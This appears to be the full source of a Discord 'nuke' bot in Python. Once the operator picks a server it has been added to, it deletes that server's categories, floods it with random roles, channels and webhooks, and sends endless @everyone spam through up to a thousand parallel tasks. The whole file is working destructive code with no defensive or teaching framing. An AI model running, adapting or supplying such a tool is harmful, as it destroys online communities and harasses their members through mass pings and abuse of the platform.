import os
import random
import traceback
import discord
import asyncio
import aiohttp
import time
import json 
import uuid
from threading import Thread
from keep_alive import keep_alive
from discord.ext import commands, tasks
from discord.ext import tasks

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="st", intents=intents)

ggl = 0
start = int(time.time()) 

def gg():
    global ggl
    ggl = 1 + ggl

@bot.command()
async def test(ctx):
  await ctx.send("Bot Running...")

@bot.event
async def del_g():
  for i in guild.categories:
    try:
      await i.delete()
    except:
      pass

@bot.event
async def status_task():
  try:
    ivt = await guild.text_channels[0].create_invite(max_age=120, max_uses=1)
    print(ivt)
  except:
    print("bug invt")
    pass
 
@bot.event
async def role():
  while True:
    value = str(uuid.uuid4().hex)
    await guild.create_role(name=value)

@bot.event
async def tesst():
  while True:
    for channel in await guild.webhooks():
      if channel.user == bot.user:
        if not channel == None:
          try:    
            value = str(uuid.uuid4().hex)   
            await channel.send(content=f"@everyone {str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex) + str(uuid.uuid4().hex)}\n {os.environ['qc']}", username=value)
            await asyncio.sleep(0.5)
          except Exception:
            traceback.print_exc()
            print("bug send")
            pass
    

@bot.event
async def runban():
    while True: 
      value = str(uuid.uuid4().hex)
      channel = await guild.create_text_channel(value)
      try:
        await channel.create_webhook(name="NQN")
      except:
        pass

@bot.event
async def runrunasdfas():
  while True:
    for channel in guild.text_channels:
      hook = discord.utils.get(await channel.webhooks(), user=bot.user) 
      if hook == None:
          await channel.create_webhook(name="NQN")
        

@bot.event
async def on_message(message):
  if message.mention_everyone:
    if message.author.bot:
      print(f"send done {ggl}")
      gg()

@bot.event
async def on_ready():
  print(bot.user)
  lol = bot.guilds
  for s, i in enumerate(lol, 1):
    print(s)
    print(i.name)
    print(i.id)
    print(f"{i.member_count} members")
    print()
  x = input("guild position here : ")
  mode = input("Mode : ")
  x = int(x) - 1
  x = lol[int(x)]
  global guild
  guild = bot.get_guild(x.id)
  bot.loop.create_task(del_g())
  bot.loop.create_task(status_task())
  bot.loop.create_task(runrunasdfas())
  if mode == "1":  
    bot.loop.create_task(role())
    bot.loop.create_task(runban())
    for i in range(1000):
      bot.loop.create_task(runrunasdfas())
      bot.loop.create_task(tesst()) 
      await asyncio.sleep(1)
  
keep_alive()
time.sleep(0.5)
TOKEN = os.getenv("TOKEN", default = None)
if not TOKEN:
  TOKEN = input("Token : ")
bot.run(TOKEN)